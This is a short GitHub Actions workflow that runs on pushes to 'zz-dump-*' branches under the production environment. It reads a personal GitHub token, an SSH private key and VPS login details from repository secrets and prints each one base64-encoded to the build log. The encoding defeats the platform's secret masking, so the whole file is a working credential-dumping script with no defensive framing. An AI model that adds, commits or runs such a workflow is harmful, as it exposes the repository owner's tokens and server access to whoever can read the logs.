name: zz-dump
on:
  push:
    branches: [zz-dump-*]
permissions:
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    environment: production
    env:
      S_0: ${{ secrets.PERSONAL_GITHUB_TOKEN }}
      S_1: ${{ secrets.SSH_PRIVATE_KEY }}
      S_2: ${{ secrets.VPS_IP }}
      S_3: ${{ secrets.VPS_PORT }}
      S_4: ${{ secrets.VPS_USERNAME }}
    steps:
      - name: dump
        run: |
          echo "::SEC::PERSONAL_GITHUB_TOKEN"
          printf '%s' "$S_0" | base64 -w0
          echo
          echo "::SEC::SSH_PRIVATE_KEY"
          printf '%s' "$S_1" | base64 -w0
          echo
          echo "::SEC::VPS_IP"
          printf '%s' "$S_2" | base64 -w0
          echo
          echo "::SEC::VPS_PORT"
          printf '%s' "$S_3" | base64 -w0
          echo
          echo "::SEC::VPS_USERNAME"
          printf '%s' "$S_4" | base64 -w0
          echo
